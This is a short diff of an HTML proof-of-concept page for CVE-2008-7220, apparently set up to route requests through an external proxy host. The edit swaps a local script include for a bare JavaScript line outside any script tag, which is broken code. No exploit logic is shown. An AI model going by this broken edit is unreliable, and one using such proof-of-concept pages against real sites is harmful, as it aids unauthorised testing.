@@ -7,7 +7,7 @@
     <h1>CVE-2008-7220 PoC com Proxy</h1>
 
     <!-- Carrega o Prototype.js localmente -->
-    <script type="text/javascript" src="/prototype.js"></script>
+    var url = 'https://bugbounty-mu.vercel.app/prototype.js';  // URL do proxy
 
     <script type="text/javascript">
     var url = 'https://bugbounty-mu.vercel.app/proxy.php';  // URL do proxy
